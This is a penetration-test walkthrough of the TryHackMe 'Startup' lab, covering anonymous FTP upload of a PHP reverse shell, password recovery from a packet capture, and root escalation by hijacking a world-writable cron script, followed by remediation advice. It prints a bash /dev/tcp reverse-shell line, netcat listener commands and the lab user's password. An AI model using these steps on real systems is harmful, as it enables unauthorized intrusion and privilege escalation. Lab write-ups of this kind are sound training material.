# Startup — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Boot2Root-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg)
![OS](https://img.shields.io/badge/OS-Linux-success.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A professional penetration test walkthrough for the **Startup** room on TryHackMe.

---

## 📋 Executive Summary
Startup is an easy Linux boot2root machine highlighting anonymous FTP file upload directly into a web-accessible directory, network packet capture analysis (`suspicious.pcap`) for credential recovery, and local cronjob script hijacking for root privilege escalation.

* **Target OS:** Linux (Ubuntu)
* **Initial Access:** Anonymous FTP write to `/ftp` -> PHP reverse shell execution via web.
* **Lateral Movement:** Wireshark PCAP inspection reveals password for `lennie`.
* **Privilege Escalation:** World-writable script `/etc/print.sh` called by root cronjob `/scripts/planner.sh`.
* **Artifacts in Directory:**
  * `shell.php`: PHP PentestMonkey reverse shell payload

---

## 🔍 Stage 1: Reconnaissance & Enumeration

### 1.1 Port Scanning
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```
* **Port 21/tcp:** vsftpd 3.0.3 (Anonymous login allowed; writable directory `ftp/`)
* **Port 22/tcp:** OpenSSH 7.2p2 Ubuntu
* **Port 80/tcp:** Apache httpd 2.4.18

### 1.2 Web & FTP Directory Mapping
Connecting to FTP anonymously:
```bash
ftp <TARGET_IP>
Name: anonymous
ftp> ls
drwxrwxrwx 2 65534 65534 4096 ftp
```
Directory fuzzing on port 80 showed `/files/` reflecting the FTP directory. Files placed in FTP `ftp/` are accessible at `http://<TARGET_IP>/files/ftp/`.

---

## 💥 Stage 2: Initial Foothold (FTP Webshell)

### 2.1 Uploading Webshell
1. Prepared PHP reverse shell (`shell.php`) configured with attacker IP and port 4444.
2. Uploaded to FTP:
   ```bash
   ftp <TARGET_IP>
   ftp> cd ftp
   ftp> put shell.php
   ```
3. Started listener:
   ```bash
   nc -lvnp 4444
   ```
4. Triggered reverse shell:
   ```bash
   curl http://<TARGET_IP>/files/ftp/shell.php
   ```
5. Shell caught as `www-data`.
6. Read recipe secret:
   ```bash
   cat /recipe.txt
   # love
   ```

---

## 📈 Stage 3: Lateral Movement & Privilege Escalation

### 3.1 Incident Analysis (`suspicious.pcap`)
In `/incidents`, found `suspicious.pcap`. Extracting cleartext strings:
```bash
strings /incidents/suspicious.pcap | grep -i pass
```
Discovered developer sudo password for user `lennie`:
* **Password:** `c4pt41nTh3sUnsh1n3`

Switching to `lennie`:
```bash
su lennie
# Password: c4pt41nTh3sUnsh1n3
cat /home/lennie/user.txt
```

### 3.2 Root Escalation (Cronjob Script Hijacking)
Inspecting `/home/lennie/scripts/planner.sh`:
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
Checking permissions on `/etc/print.sh`:
```bash
ls -la /etc/print.sh
# -rwxr-xrwx 1 root root /etc/print.sh
```
`/etc/print.sh` is world-writable and executed as `root` by cron every minute.

Appending reverse shell payload:
```bash
echo "bash -i >& /dev/tcp/10.xx.xx.xx/5555 0>&1" >> /etc/print.sh
```
Listening on port 5555:
```bash
nc -lvnp 5555
```
Within one minute, received root shell:
```bash
whoami
# root
cat /root/root.txt
```

---

## 🛡️ Remediation
1. **Disable Anonymous FTP Write Permissions:** Prevent unauthorized uploads.
2. **Separate Uploads from Script Execution:** Configure the web server to prohibit executing PHP scripts in `/files/ftp`.
3. **Harden Cron Script Permissions:** Ensure all administrative scripts invoked by cron are strictly owned by `root:root` with permissions `755`.
